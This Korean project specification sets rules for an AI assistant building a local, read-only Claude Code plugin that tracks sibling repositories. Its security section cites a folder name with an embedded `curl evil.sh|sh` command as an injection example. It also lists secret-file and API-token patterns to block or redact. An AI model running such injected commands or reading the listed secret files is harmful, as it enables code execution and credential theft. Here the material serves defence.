# 소담그래프엔지니어링 (SoDam-Graph-Eng) — 프로젝트 스펙

> AI가 코드를 짤 때 지켜야 할 규칙과 절대 하면 안 되는 것.
> **이 문서를 AI에게 항상 함께 공유하세요.**

---

## 기술 스택

| 영역 | 선택 | 이유 |
|------|------|------|
| 형태 | Claude Code 플러그인 (+ PRIVATE 마켓플레이스) | 형제 6개 전부 동일 형태 — 설치·관리 방식을 통일해야 "7형제 조화"가 성립 |
| 실행 언어 | Node.js (`.mjs`) | 형제들이 hooks에 `.mjs` 를 이미 사용 (실측). 새 런타임을 들이면 형제 간 이질성이 늘어남 |
| 저장소 | **파일 6개** — `data/` 안 5개(`graph.json`·`snapshot.json`·`rejected.json`·`.lock`·`shadow/`) + 공유 발행 `~/.sodam/graph-state.json` | 7형제 규모에 DB는 과함. 설치 0, git 버전관리, AI가 즉시 읽음 (결정 확정) |
| 그림 | Mermaid | 마크다운·터미널에서 바로 보임. 외부 렌더러 불필요 |
| 서버 | 없음 | 본인 전용 로컬 도구 |
| 데이터베이스 | 없음 | Phase 3에서 선택 백엔드로만 검토 |
| 인증 | 없음 | 로그인·계정 개념 자체가 없음 |
| 라이선스 | **Apache License, Version 2.0** | **2026-08-02 실측 — 형제 6/6 전부 Apache-2.0.** 저작권자 `Copyright 2026 SoDam AI Studio` ([`09_LEGAL_LICENSE_SPEC.md`](./09_LEGAL_LICENSE_SPEC.md)) |

> ⚠️ 가정 3·5·6: 플러그인 형태 / Node.js / Apache-2.0 — 형제 관례를 따른 기본값입니다. 다르게 가고 싶으시면 알려주세요.
> ✅ **가정 4 확정: 저장소 = `sodam-ai/SoDam-Graph-Eng` (PRIVATE)** — 2026-08-02 실측상 6형제 전부 `sodam-ai/SoDam-{X}-Eng` 형식입니다.
> 🔴 **소문자로 만들지 마십시오.** `03_PHASES.md` M0의 `done_when` 이 `https://github.com/sodam-ai/SoDam-Graph-Eng.git` 반환이라 **소문자로 만들면 M0가 즉시 실패**하고, GitHub 저장소는 만든 뒤 이름 변경이 번거롭습니다.

---

## 프로젝트 구조

```
sodam-graph-eng/
├── .claude-plugin/
│   └── plugin.json          # 플러그인 매니페스트
├── commands/
│   ├── graph-where.md       # 지금 어디
│   ├── graph-next.md        # 다음 할 일
│   ├── graph-map.md         # 관계도
│   ├── graph-why.md         # 지금 딱 하나만 푼다면 이것
│   ├── graph-shadow.md      # 그림자 추적 입력
│   ├── graph-reject.md      # done 승격 거부 (승격 전)
│   └── graph-undo.md        # done 되돌리기 (승격 후)
├── hooks/
│   └── session-start.mjs    # 세션 시작 자동 주입 (끌 수 있음, 1초 예산)
├── lib/
│   ├── safeWrite.mjs        # 🔒 모든 파일 쓰기의 유일한 통로 (08 S-3 ②겹)
│   ├── gitSafe.mjs          # 🔒 git 실행 래퍼 (셸 미사용 + 읽기 서브커맨드 화이트리스트)
│   ├── loadGraph.mjs        # 🔒 graph.json 로드 + 입력 검증(08 S-7) + 경로 검증(S-2)
│   ├── resolve.mjs          # 형제 찾기 (repo_remote 정규화 → markers → lost)
│   ├── scan.mjs             # 형제 폴더 실측 (읽기 전용) + 1층 추출
│   ├── publish.mjs          # ~/.sodam/graph-state.json 원자적 발행
│   ├── judge.mjs            # 단계 판정 + done 승격 (E1|E2 필수)
│   ├── critical.mjs         # 순환 탐지 → 사이클 제외 → 임계 경로
│   ├── lock.mjs             # data/.lock 파일 잠금 (동시 세션)
│   └── mermaid.mjs          # 관계도 생성
├── data/
│   ├── graph.json           # 정본 — 경로 없음                [git 추적]
│   ├── snapshot.json        # 실측 캐시                       [.gitignore]
│   ├── rejected.json        # 승격 거부 이력                   [git 추적]
│   ├── .lock                # 동시 세션 쓰기 잠금               [.gitignore]
│   └── shadow/              # 그림자 추적                      [git 추적]
│       ├── sodam-harness-eng.md
│       └── sodam-loop-eng.md
├── tools/
│   └── make-fixture.sh      # _test_fixture/ 생성 (아래 §테스트 방법 참조)
├── _test_fixture/           # 개명 테스트용 더미 저장소 (스크립트로 생성, 실제 형제 대신)
├── .PRD/                    # 이 설계 문서들
├── .gitignore
├── README.md                # 한국어 설치·사용 안내
└── LICENSE

~/.sodam/graph-state.json    # 🆕 공유 발행 (6형제 읽기 전용) — 저장소 밖
```

### `.gitignore` (필수)

```gitignore
data/snapshot.json    # 스캔마다 바뀜 — 커밋하면 노이즈 폭증
data/.lock            # 실행 중에만 존재
node_modules/
```

> `data/shadow/` 와 `data/rejected.json` 은 **추적합니다.** 사람이 준 정보·결정이라 잃어버리면 안 됩니다.
> ✅ **`.PRD/` 추적 여부 — 결정 완료: 추적함** (사용자 결정, 2026-08-02 · 커밋 `a02f7cf` 로 실행 완료, `.PRD/*.md` 12개).
> 근거: 형제 관례는 2:2로 갈렸으나(하네스 14개·프롬프트 8개 추적 / 컨텍스트·리버스 0), **설계 근거 12문서를 잃으면 왜 그렇게 만들었는지 복구할 수 없습니다.**
> 🔴 **단, `.PRD` 에는 실제 경로(`D:\AI_Dev_Work\...`)와 커밋 해시가 들어 있습니다.** PRIVATE인 동안은 영향이 작지만 **PUBLIC 전환 시 마스킹 재검토**가 필요합니다 (`09_LEGAL_LICENSE_SPEC.md` L-6.4 · §10 게이트 2번).
> 도구 부산물 `.omc/`·`.remember/` 는 **제외**합니다 — 세션 ID·로그라 설계 근거가 아니고, 형제(하네스·프롬프트)도 동일하게 `.gitignore` 합니다(실측).

### `lib/` 의존성 원칙

Phase 1은 **Node.js 기본 기능 + `child_process` 로 부르는 `git` 뿐**입니다. npm 패키지 0개가 목표입니다.
`critical.mjs` 의 순환 탐지·위상 정렬은 노드 7개 규모라 **직접 구현이 라이브러리보다 짧습니다** (`RESEARCH_SOURCES.md` §12-1 NetworkX는 Python이고 규모도 과합니다 — 사상만 차용).

> ⚠️ 주의 — `plugin.json` 의 `agents` 필드는 **개별 `.md` 파일 경로를 나열해야 합니다** (디렉터리 지정은 거부됨). 형제 프로젝트에서 공통으로 겪은 오류입니다. `skills`/`commands` 는 디렉터리로도 됩니다. 경로는 `./` 로 시작해야 합니다.

---

## 절대 하지 마 (DO NOT)

> AI에게 코드를 시킬 때 이 목록을 반드시 함께 공유하세요.

- [ ] **형제 저장소 6곳의 파일을 생성·수정·삭제하지 마.** 읽기만 해. 추적 파일이 없어도 **형제 쪽에** 만들어 넣지 마. (읽기 전용 결정 — 이 프로젝트에서 가장 중요한 금지 사항)
  - ✅ **단, 그림자 추적은 만들어야 해.** 추적 파일이 없는 형제의 상세는 **`data/shadow/<id>.md`(그래프 저장소 안)** 에 기록해. 이건 형제 저장소를 안 건드리므로 위 금지에 걸리지 않아 (`06_ANTI_STALL_SPEC.md` §2). **이 예외를 모르면 M10을 아예 안 만들게 돼.**
- [ ] **다음 단계를 자동으로 실행하지 마.** 판정하고 알려주는 데서 멈춰. 실행은 소담루프엔지니어링 담당.
- [ ] **판정 못 하는 걸 그럴듯하게 지어내지 마.** 상세를 모르면 **`state="coarse"`** 로 표시하고 1층 요약(미완료 N건·마지막 갱신일)과 근거를 함께 밝혀. 추적 파일조차 없는 형제는 git 활동만으로 `coarse` 를 만들고 그 사실을 명시해. **`미상` 이라는 표기는 쓰지 마** — 1층이 되는 형제는 "모르는" 게 아니라 "거칠게 아는" 상태야.
- [ ] **`graph.json`(정본)을 기계가 조용히 덮어쓰지 마.** 실측은 `snapshot.json` 에만 쓰고, 어긋나면 경고만 해.
- [ ] **형제 이름을 줄여 쓰지 마.** "루프", "그래프" 같은 축약 금지. 매번 `소담루프엔지니어링 (SoDam-Loop-Eng)` 처럼 완전한 이름을 써.
- [ ] **`RESEARCH_SOURCES.md` 를 수정하거나 지우지 마.** 사용자가 직접 만든 조사 자료야.
- [ ] **remote 를 정규화 없이 문자열 비교하지 마.** `https://github.com/sodam-ai/SoDam-Loop-Eng.git` 과 `sodam-ai/SoDam-Loop-Eng` 는 같은 것이야. 호스트 제거 + `.git` 제거 + 소문자화 후 비교해 (`02_DATA_MODEL.md` 정규화 규칙).
- [ ] **`repo_remote` 를 축약해서 쓰지 마.** 실측값은 `sodam-ai/SoDam-Loop-Eng` 야. `sodam-loop` 같은 축약형을 쓰면 **7형제 전원 매칭 실패**해.
- [ ] **🔴 실제 형제 폴더를 개명하지 마.** 개명 내성 테스트는 `_test_fixture/` 더미로만. 2026-08-02 실측상 **다른 세션이 형제 폴더를 동시에 작업 중**이라 개명하면 그 세션이 깨져.
- [ ] **`~/.sodam/` 의 다른 파일(`loop-state.json` 등)을 건드리지 마.** 소담그래프엔지니어링이 쓰는 건 `graph-state.json` **하나뿐**이야. 나머지는 형제 소유 (정본 §3-3).
- [ ] **`PreToolUse` 훅을 만들지 마.** 정본 `family-synergy.md` §3 규약 A — 훅이 병렬 실행이라 형제마다 확인창이 뜨면 permission fatigue로 안전이 무력화돼. 안전 판정은 소담하네스엔지니어링 단독.
- [ ] **`bypassPermissions` 모드를 사용자에게 권유하지 마.** 정본 §3 규약 B — 모든 훅을 무효화해(실측 확인됨).
- [ ] **훅에서 `updatedInput` 으로 입력을 고쳐 통과시키지 마.** 정본 §3 규약 C.
- [ ] **"100% 안전"·"완전히 해결"류 표현을 쓰지 마.** 하네스 `SODAM_FAMILY_COEXIST.md` §7 — 6개 프로젝트 공통 금지. 코드가 없는 단계에서 `✅ 해결` 로 적는 것도 같은 과잉 확신이야.
- [ ] **외부 서비스·그래프 DB·유료 API를 Phase 1에 끌어들이지 마.** 파일과 Node.js 기본 기능만.
- [ ] **API 키·비밀번호를 코드에 쓰지 마.** 이 프로젝트는 애초에 필요 없어야 정상.
- [ ] **테스트 없이 "완료"라고 하지 마.** `done_when` 을 충족한 증거를 함께 제시해.
- [ ] **`SoDam_Family` 우산 저장소에 push 하지 마.** 편집까지만, 최종 push는 사용자가 직접.
- [ ] **폴더 절대경로를 `graph.json` 정본에 쓰지 마.** 경로는 `snapshot.json` 의 파생값이야. 정본 식별 열쇠는 `repo_remote` + `markers` 뿐. (폴더 개명이 잦다는 게 실측으로 확인됨 — `02_DATA_MODEL.md` 참조)
- [ ] **형제를 못 찾았는데 옛 경로를 조용히 재사용하지 마.** `resolve_status: "lost"` 로 표시하고 멈춰.
- [ ] **`CLAUDE.md` · `AGENTS.md` · `.claude/settings.json` · `~/.codex/config.toml` 을 건드리는 도구를 검증 없이 설치하지 마.** GitNexus·CodeGraph·Codebase Memory MCP 는 설치 시 이 파일들을 자동 수정할 수 있어 (`RESEARCH_SOURCES.md` §18-6). **반드시 `--print-config` 로 먼저 출력만 확인하고, 설치 전후 `git diff` 로 무변경을 입증한 뒤에만 채택해.** 이 PC의 `CLAUDE.md` 는 에이전트 1,356개·스킬 653개의 유일한 라우팅 인프라라 손상되면 7형제가 아니라 작업 환경 전체가 무너져.
- [ ] **그래프 DB를 쓰게 되면 쓰기 권한부터 주지 마.** 읽기 전용 계정·최소 권한·삭제/DDL 비활성화부터 (`RESEARCH_SOURCES.md` §18-7).
- [ ] **`data/snapshot.json` 을 git에 커밋하지 마.** 스캔할 때마다 바뀌어서 커밋 노이즈가 폭증해. `.gitignore` 필수.

### 🔒 보안 금지 조항 (상세·수용 기준은 [`08_SECURITY_SPEC.md`](./08_SECURITY_SPEC.md))

> **보안은 선택 사항이 아니라 핵심 요구사항이야.** 아래는 Must 항목만 옮긴 것이고, 전체는 08번 문서에 있어.

- [ ] **`shell: true` 를 절대 쓰지 마. `exec`·`execSync` 도 금지.** `execFileSync`/`spawnSync` 에 **인자 배열**로만 전달해. 폴더명이 `test$(curl evil.sh|sh)` 이어도 실행되면 안 돼 (S-1)
- [ ] **경로를 정규화 없이 쓰지 마.** `path.resolve()` 후 `search_roots` 하위인지 검증하고, 아니면 `resolve_status:"rejected_path"` 로 거부해. `markers[].file` 에 `..`·절대경로가 오면 로드 시점에 막아 (S-2)
- [ ] **심볼릭 링크를 따라가지 마.** 순환 참조로 무한 탐색에 빠져 (S-2.4)
- [ ] **파일 쓰기를 `safeWrite.mjs` 밖에서 하지 마.** `scan.mjs`·`resolve.mjs` 는 쓰기 API를 **import조차 하면 안 돼** (S-3 ①②겹)
- [ ] **읽기 전용 git 서브커맨드만 써.** `status`·`log`·`remote`·`rev-parse`·`cat-file`·`ls-files` 만 허용. `add`·`commit`·`checkout`·`clean`·`reset`·`push` 는 **차단** (S-3 ③겹)
- [ ] **시크릿 파일을 읽지 마.** `.env*`·`*.pem`·`*.key`·`id_rsa*`·`credentials*`·`*secret*`·`.npmrc`·`.netrc` — **`tracking_files` 에 이름조차 넣지 마** (S-4.1~2)
- [ ] **커밋 제목을 그대로 저장하지 마.** `ghp_`·`sk-`·`AKIA`·`AIza`·`-----BEGIN` 패턴이 있으면 `[REDACTED]` 로 마스킹하고, **`graph-state.json` 에는 커밋 제목을 아예 넣지 마** (S-4.4~5)
- [ ] **`graph.json`·`shadow/*.md` 에 시크릿을 적지 마.** 이 둘은 **git 추적 대상**이야
- [ ] **탐색 상한을 빼먹지 마.** 깊이 4 · 디렉터리 500개 · git 타임아웃 5초 · 파일 5MB · 세션 hook 1초 (S-5)
- [ ] **입력을 신뢰하지 마.** 명령 인자·`graph.json` 값·폴더명·커밋 제목·환경변수 **전부 검증 대상**이야 (S-7)
- [ ] **API 키·비밀번호를 만들지 마.** 이 프로젝트는 시크릿이 **하나도 없는 상태**가 정상이고, 그게 가장 강한 보안이야

---

## 항상 해 (ALWAYS DO)

- [ ] 변경하기 전에 계획을 먼저 보여줘
- [ ] git 명령은 **반드시 `repo_root` 기준**으로 실행해 (`git -C <repo_root>`)
- [ ] 형제를 훑은 뒤에는 **`git status` 로 변경 0건을 입증**해
- [ ] 판정 결과에 **근거를 함께** 붙여 ("6일 무활동 — 마지막 커밋 2026-07-27 `docs:`")
- [ ] 각 마일스톤이 끝나면 `done_when` 충족 증거를 보고해
- [ ] 세션 시작 자동 주입은 **끄는 방법을 반드시 함께 제공**해 (항상 켜져 있으면 방해가 됨)
- [ ] 한국어로 출력해 (명령어·경로·코드는 원문 유지)
- [ ] Windows 경로 구분자(`\`)와 UTF-8 인코딩을 고려해

---

## 형제 공존 규칙

> **상세는 [`07_FAMILY_COEXIST.md`](./07_FAMILY_COEXIST.md) 가 정본 종속 문서입니다.** 여기는 요약입니다.

| 항목 | 규칙 |
|------|------|
| 명령어 이름 | **전부 `graph-` 접두사.** 짧은 일반명(`status`·`start`·`log`) 절대 금지 — 형제 간 중복 6건이 이미 발생함(실측) |
| hook 등록 | `plugin.json` 에 hooks를 **중복 선언하지 않기** (자동 로드됨) |
| 공용 파일 | 형제 공유 설정 파일은 건드리지 않기 |
| 세션 시작 출력 | **3줄 이내** (`07` 규약 E1). 패밀리 합계 상한 10줄 |
| 성능 | 세션 시작 hook **1초 이내** (`07` 규약 E5) |

**Phase 1 시작 전에 읽어야 할 형제 문서 (읽기 전용):**

1. **`SoDam-Agentic-Eng/docs/family-synergy.md`** — **정본** (**6,926바이트 · 2026-08-02 11:35 갱신됨**, 소담에이전틱엔지니어링 소유)
   - 🔴 **읽기 직전에 크기·수정 시각을 다시 확인하십시오.** 이 PRD 작성 중에도 정본이 6,210B → 6,926B 로 바뀌었습니다(§5에 *"공용 `sodam` 이름 재사용 폐기 → 형제마다 고유 마켓플레이스·플러그인 이름"* 정정 추가). **낡은 정본 기준으로 M8 갱신안을 쓰면 또 어긋납니다.**
2. `SoDam-Harness-Eng/.PRD/SODAM_FAMILY_COEXIST.md` — 하네스 관점 초기 메모 (7,467바이트)

---

## 테스트 방법

```bash
# 스캐너 단독 실행 (읽기 전용 확인용)
node lib/scan.mjs

# 핵심 테스트 1 — 형제 저장소 무변경 입증
#   ★ 경로를 하드코딩하지 말고 resolve 결과를 쓸 것 (폴더 개명에 안 깨지게)
node -e "import('./lib/resolve.mjs').then(m=>m.all().forEach(p=>console.log(p.repo_root)))" \
  | while read r; do git -C "$r" status --porcelain; done
# → 스캔 전후 결과가 동일해야 통과

# 핵심 테스트 2 — 정본에 절대경로가 없는지
grep -c '"D:\\\\' data/graph.json    # search_roots 1건 외 0이어야 통과

# 핵심 테스트 3 — 개명 내성 (더미로만!)
mv _test_fixture/repo_a _test_fixture/repo_a_renamed && node lib/resolve.mjs
# → 개명 후에도 찾아내야 통과. ★ 실제 형제 폴더로 하면 안 됨

# 핵심 테스트 4 — 세션 시작 성능
time node hooks/session-start.mjs    # 1초 이내

# 플러그인 매니페스트 검증
claude plugin validate .
```

**실사용 검증은 반드시 새 세션에서 합니다.** 같은 세션 셀프테스트는 검증으로 치지 않습니다.

### 🔴 `_test_fixture/` 만드는 법 (M2 `done_when` 의 전제)

문서 5곳이 *"개명 테스트는 `_test_fixture/` 더미로"* 라고 하는데 **만드는 방법이 없었습니다.** 이게 없으면 M2를 완료할 수 없습니다.

```bash
# repo_a — resolve 1순위(repo_remote) 테스트용
mkdir -p _test_fixture/repo_a/.claude-plugin && cd _test_fixture/repo_a
git init -q
git remote add origin https://github.com/sodam-ai/SoDam-Fixture-A.git
echo '{"name":"sodam-fixture-a"}' > .claude-plugin/plugin.json
git add -A && git commit -qm "fixture"
cd ../../

# repo_b — resolve 2순위(markers) 테스트용: remote 없음
mkdir -p _test_fixture/repo_b/.claude-plugin && cd _test_fixture/repo_b
git init -q
echo '{"name":"sodam-fixture-b"}' > .claude-plugin/plugin.json
git add -A && git commit -qm "fixture"
cd ../../
```

| 픽스처 | remote | markers | 검증하는 것 |
|--------|--------|---------|-----------|
| `repo_a` | O | O | `found_by_remote` + **개명 내성** |
| `repo_b` | **X** | O | `found_by_marker` 폴백 |
| (없는 것) | — | — | `lost` 처리 — `graph.json` 에만 있고 디스크에 없는 항목으로 테스트 |

> 🟢 **실제 GitHub 저장소를 만들 필요 없습니다.** `git remote add` 만 하면 `git remote get-url origin` 이 값을 돌려주므로 resolve 로직이 그대로 테스트됩니다. **이 판단이 없으면 구현 AI가 GitHub에 더미 저장소를 만들려 합니다.**
>
> `_test_fixture/` 는 **`.gitignore` 하지 않습니다** — 테스트 재현성을 위해 추적합니다. 단 `repo_a/.git` 중첩 저장소가 되므로 **상위 저장소에는 `_test_fixture/*/.git` 을 무시**시키거나 픽스처를 스크립트로 매번 생성하십시오 (권장: **스크립트 생성** — `tools/make-fixture.sh`).

---

## 설치 방법

```
1. GitHub 저장소를 마켓플레이스로 추가
2. 플러그인 설치
3. Claude Code 완전 재시작 (필수 — 재시작 없으면 옛 버전이 캐시됨)
```

> ⚠️ 가정 12: `SoDam_Family` 우산 저장소 문서 갱신은 AI가 편집까지 하고, **최종 push는 사용자가 직접** 합니다.

---

## 환경변수

API 키·토큰·계정은 **하나도 없습니다.** 동작 제어용 2개만 있습니다.

| 변수 | 용도 | 기본값 |
|------|------|-------|
| `SODAM_GRAPH_SILENT` | `1` 이면 세션 시작 출력 끔 | 미설정(=출력함) |
| `SODAM_GRAPH_ROOT` | `search_roots` 덮어쓰기 (Phase 2 이식성 · **테스트 시 `_test_fixture` 로 격리**) | 미설정 |
| `SODAM_GRAPH_DEBUG` | `1` 이면 디버그 출력 (**시크릿 마스킹은 그대로 적용**) | **꺼짐** |

> 접두사는 **`SODAM_GRAPH_*`** 로 고정합니다 (`07_FAMILY_COEXIST.md` §3). ~~`SODAM_ROOT`~~ 는 형제와 충돌할 수 있어 폐기했습니다.

---

## [NEEDS CLARIFICATION]

**2026-08-02 2차 개정에서 해소됨**

- ~~저장소 이름~~ → **`sodam-ai/SoDam-Graph-Eng`**. 근거: 6형제 전부 `sodam-ai/SoDam-{X}-Eng` 형식임이 실측으로 확인됨
- ~~명령어 접두사~~ → **`graph-` 고정**. 실측 결과 6형제 명령 41개·설치 플러그인 전체에 `graph` 로 시작하는 것 **0건**
- ~~세션 자동 주입 기본값~~ → **켬 + 3줄 + 1초 예산 + 끄는 법 제공**

**남은 것**

- [x] ~~`.PRD` 를 git 추적할지~~ → **추적함으로 결정·실행 완료** (2026-08-02, 커밋 `a02f7cf`). 상세는 위 §프로젝트 구조 각주 참조
- **남은 것: 없음** — 프로젝트 스펙 관련 미결은 전부 해소됐습니다. 전체 미결 1건(`SoDam-Agentic-Eng` 한글 명칭)은 `01_PRD.md §9` 참조
